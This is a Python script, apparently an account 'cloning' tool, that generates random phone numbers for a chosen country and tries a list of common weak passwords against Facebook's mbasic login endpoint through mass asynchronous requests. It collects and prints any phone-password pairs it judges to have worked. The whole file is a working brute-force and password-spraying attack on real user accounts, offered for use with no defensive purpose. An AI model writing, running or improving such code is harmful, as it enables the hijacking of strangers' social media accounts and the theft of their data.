import asyncio
import aiohttp
import random
import os

os.system("clear")

print("\033[1;92m" + "=" * 50)
print("\t███████╗  █████╗     ███████╗")
print("\t██╔════╝ ██╔══██╗    ██╔════╝")
print("\t███████╗ ███████║    █████╗  ")
print("\t╚════██║ ██╔══██║    ██╔══╝  ")
print("\t███████║ ██║  ██║    ███████╗")
print("\t╚══════╝ ╚═╝  ╚═╝    ╚══════╝")
print("=" * 50)
print("\t\t💀  F♡A - Cloning System  💀")
print("=" * 50 + "\033[0m\n")

countries = {
    "1": {"name": "Afghanistan", "code": "+93"},
    "2": {"name": "Pakistan", "code": "+92"},
    "3": {"name": "India", "code": "+91"},
    "4": {"name": "Bangladesh", "code": "+880"},
    "5": {"name": "USA", "code": "+1"},
}

passwords = [
    "123456", "1234567", "12345678", "123456789", "1234567890",
    "۱۲۳۴۵۶", "۱۲۳۴۵۶۷", "۱۲۳۴۵۶۷۸۹", "۱۲۳۱۲۳", "۱۲۳۴۱۲۳۴",
    "۱۰۰۲۰۰۳۰۰", "123123", "12341234", "10002000", "500600"
]

urls = [
    "https://mbasic.facebook.com/login/device-based/login/async/",
] + [f"https://example.com/api/check{i}" for i in range(1, 301)]

async def select_country():
    print("\n🌍 Select a country:\n")
    for key, value in countries.items():
        print(f"{key}. {value['name']} ({value['code']})")

    choice = input("\n🌐 Your choice: ")
    return countries.get(choice, None)

def generate_phone_numbers(country_code, count=1000):
    return [country_code + str(random.randint(100000000, 999999999)) for _ in range(count)]

async def test_account(session, phone, password, url):
    data = {"email": phone, "pass": password, "login": "Log In"}
    try:
        async with session.post(url, data=data) as response:
            text = await response.text()
            if "success" in text:
                return phone, password
    except:
        pass
    return None

async def start_cloning(country_code):
    success_count = 0
    fail_count = 0
    successful_accounts = []

    async with aiohttp.ClientSession() as session:
        while True:
            phone_numbers = generate_phone_numbers(country_code, 1000)
            tasks = []
            for index, phone in enumerate(phone_numbers):
                for password in passwords:
                    url = urls[index % len(urls)]
                    tasks.append(test_account(session, phone, password, url))

            results = await asyncio.gather(*tasks)

            for result in results:
                if result:
                    phone, password = result
                    success_count += 1
                    successful_accounts.append(f"successful {phone} | {password}")
                else:
                    fail_count += 1

            print(f"\n✅ Running... \033[1;92mSuccess [{success_count}]\033[0m | \033[1;91mFailed [{fail_count}]\033[0m\n")
            for acc in successful_accounts:
                print(acc)

async def main():
    selected_country = await select_country()
    if not selected_country:
        print("\033[1;91mInvalid selection! Exiting...\033[0m")
        return

    await start_cloning(selected_country["code"])

if __name__ == "__main__":
    asyncio.run(main())